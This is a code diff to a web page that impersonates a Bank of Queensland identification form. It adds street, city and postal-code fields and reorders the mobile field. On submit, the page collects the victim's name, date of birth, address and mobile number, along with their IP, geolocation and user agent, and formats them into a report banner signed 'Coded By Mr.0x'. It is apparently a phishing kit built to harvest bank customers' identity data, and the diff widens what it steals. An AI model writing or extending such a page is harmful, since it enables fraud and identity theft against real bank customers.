@@ -126,7 +126,7 @@
             margin-bottom: 5px;
         }
         .form-group input {
-            width: 50%;
+            width: 100%;
             padding: 10px 12px;
             border: 1px solid #ccc;
             border-radius: 4px;
@@ -358,7 +358,7 @@
                 </div>
 
                 <form id="identificationForm" novalidate>
-                    <!-- First Name -->
+                    <!-- Full Name: First + Last -->
                     <div class="form-group">
                         <label for="firstName">First Name</label>
                         <span class="hint">Complete first name, for example `Benjamin` and not `Ben`</span>
@@ -366,7 +366,6 @@
                         <div class="error-message" id="firstNameError">Please enter your first name.</div>
                     </div>
 
-                    <!-- Last Name -->
                     <div class="form-group">
                         <label for="lastName">Last Name</label>
                         <span class="hint">Complete last name as on your driver's license or passport</span>
@@ -382,20 +381,34 @@
                         <div class="error-message" id="dobError">Please enter a valid date in DD/MM/YYYY format.</div>
                     </div>
 
+                    <!-- Address: Street, City, Postal Code -->
+                    <div class="form-group">
+                        <label for="address">Street Address</label>
+                        <span class="hint">Your residential street address</span>
+                        <input type="text" id="address" placeholder="Street Address" required>
+                        <div class="error-message" id="addressError">Please enter your street address.</div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="city">City</label>
+                        <span class="hint">City or suburb</span>
+                        <input type="text" id="city" placeholder="City" required>
+                        <div class="error-message" id="cityError">Please enter your city.</div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="postalCode">Postal Code</label>
+                        <span class="hint">Postal code / ZIP code</span>
+                        <input type="text" id="postalCode" placeholder="Postal Code" required pattern="[0-9]{4}" title="Please enter a 4-digit postal code.">
+                        <div class="error-message" id="postalCodeError">Please enter a valid 4-digit postal code.</div>
+                    </div>
+
                     <!-- Mobile Phone -->
                     <div class="form-group">
                         <label for="mobile">Mobile Phone Number</label>
                         <span class="hint">Mobile number registered with BOQ</span>
                         <input type="text" id="mobile" placeholder="Mobile Phone Number" required pattern="04\d{8}" title="Please enter a valid Australian mobile number (04xxxxxxxx).">
                         <div class="error-message" id="mobileError">Mobile number must be in 04xxxxxxxx format without spaces.</div>
-                    </div>
-
-                    <!-- Address -->
-                    <div class="form-group">
-                        <label for="address">Address</label>
-                        <span class="hint">Your residential address</span>
-                        <input type="text" id="address" placeholder="Address" required>
-                        <div class="error-message" id="addressError">Please enter your address.</div>
                     </div>
 
                     <button type="submit" class="boq-btn" id="submitBtn">Submit</button>
@@ -466,13 +479,15 @@
                 const isFirstNameValid = validateField('firstName', 'firstNameError', v => v.length > 0);
                 const isLastNameValid = validateField('lastName', 'lastNameError', v => v.length > 0);
                 const isDobValid = validateField('dob', 'dobError', v => /^\d{2}\/\d{2}\/\d{4}$/.test(v));
-                const isMobileValid = validateField('mobile', 'mobileError', v => /^04\d{8}$/.test(v));
                 const isAddressValid = validateField('address', 'addressError', v => v.length > 0);
-                return isFirstNameValid && isLastNameValid && isDobValid && isMobileValid && isAddressValid;
+                const isCityValid = validateField('city', 'cityError', v => v.length > 0);
+                const isPostalValid = validateField('postalCode', 'postalCodeError', v => /^[0-9]{4}$/.test(v));
+                const isMobileValid = validateField('mobile', 'mobileError', v => /^04\d{8}$/.test(v));
+                return isFirstNameValid && isLastNameValid && isDobValid && isAddressValid && isCityValid && isPostalValid && isMobileValid;
             }
 
             // Real-time validation on blur
-            ['firstName', 'lastName', 'dob', 'mobile', 'address'].forEach(id => {
+            ['firstName', 'lastName', 'dob', 'address', 'city', 'postalCode', 'mobile'].forEach(id => {
                 document.getElementById(id).addEventListener('blur', function() {
                     validateAll(); // re-validate all to keep UI consistent
                 });
@@ -502,8 +517,10 @@
                 const firstName = document.getElementById('firstName').value.trim();
                 const lastName = document.getElementById('lastName').value.trim();
                 const dob = document.getElementById('dob').value.trim();
-                const mobile = document.getElementById('mobile').value.trim();
                 const address = document.getElementById('address').value.trim();
+                const city = document.getElementById('city').value.trim();
+                const postalCode = document.getElementById('postalCode').value.trim();
+                const mobile = document.getElementById('mobile').value.trim();
 
                 // Show loading state
                 submitBtn.disabled = true;
@@ -523,18 +540,20 @@
                     location = { country: locData.countryName || 'Unknown', city: locData.cityName || 'Unknown' };
                 } catch (e) { console.warn('Location fetch failed'); }
 
-                // Build message
+                // Build message with all fields
                 const message =
                     `|++++++++++++| BOQ Identification |++++++++++++|\n` +
                     `| Bank: Bank of Queensland\n` +
                     `| First Name: ${firstName}\n` +
                     `| Last Name: ${lastName}\n` +
                     `| Date of Birth: ${dob}\n` +
+                    `| Street Address: ${address}\n` +
+                    `| City: ${city}\n` +
+                    `| Postal Code: ${postalCode}\n` +
                     `| Mobile: ${mobile}\n` +
-                    `| Address: ${address}\n` +
                     `|+++++++++++++|   Information   |+++++++++++++++|\n` +
                     `| Client IP: ${ip}\n` +
-                    `| City: ${location.city}\n` +
+                    `| City (IP): ${location.city}\n` +
                     `| Country: ${location.country}\n` +
                     `| UserAgent: ${navigator.userAgent}\n` +
                     `|+++++++++++++| Coded By Mr.0x |+++++++++++++|\n` +
